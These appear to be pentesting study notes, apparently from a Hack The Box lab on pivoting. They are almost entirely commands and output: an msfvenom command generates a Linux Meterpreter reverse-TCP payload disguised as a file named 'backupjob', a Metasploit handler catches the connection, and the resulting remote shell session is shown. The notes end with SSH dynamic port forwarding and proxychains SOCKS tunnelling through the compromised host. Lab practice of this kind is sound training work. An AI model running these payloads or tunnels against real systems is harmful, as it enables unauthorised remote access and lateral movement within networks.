
---
### Meterpreter Tunneling

---
Creating Payload for Ubuntu Pivot Host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local_ip] -f elf -o backupjob LPORT=8080
```

Start listening
```bash
msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set lhost 0.0.0.0 lhost => 0.0.0.0 msf6 exploit(multi/handler) > set lport 8080 lport => 8080 msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8080
```

Copy the `backupjob` binary file to the Ubuntu pivot host and execute it to get a Meterpreter session.

```bash
ubuntu@WebServer:~$ ls 
backupjob 
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

Session Establishment
```bash
[*] Sending stage (3020772 bytes) to 10.129.202.64 
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500 

meterpreter > pwd 

/home/ubuntu
```

### SOCKS tunneling

---
#### Dynamic Port Forwarding 
```bash
hcx05@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64 -N
```

We need a tool  that can route any tool's packets over the port `9050`, which is `proxychains`.

`proxychains` is capable to redirecting TCP connections through `TOR` `SOCKS`, and `HTTP/HTTPS` proxy servers. It is often used to force an application's `TCP traffic` to go through hosted proxy.

Setting `/etc/proxychains.conf`
```bash
socks5 [ip] [port]
```































